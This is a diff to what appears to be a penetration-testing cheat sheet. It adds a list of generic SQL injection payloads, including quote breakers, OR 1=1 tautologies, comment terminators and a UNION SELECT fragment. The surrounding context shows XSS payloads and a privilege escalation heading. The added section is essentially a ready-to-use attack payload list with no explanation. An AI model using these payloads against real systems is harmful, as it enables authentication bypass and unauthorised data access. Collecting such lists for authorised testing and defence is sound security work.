@@ -181,7 +181,28 @@ if(!$con)...
 <image src="javascript:alert(1)">
 <script src="javascript:alert(1)">
 ```
-
+-------------------------------------------------------------------------------------------------------
+## SQL injection payload list
+`Generic SQL Injection Payloads`
+```
+'
+''
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+'or 1=1 -- -
+" OR "" = "
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+```
 
 -------------------------------------------------------------------------------------------------------
 ## lxc/lxd Privilege Escalation
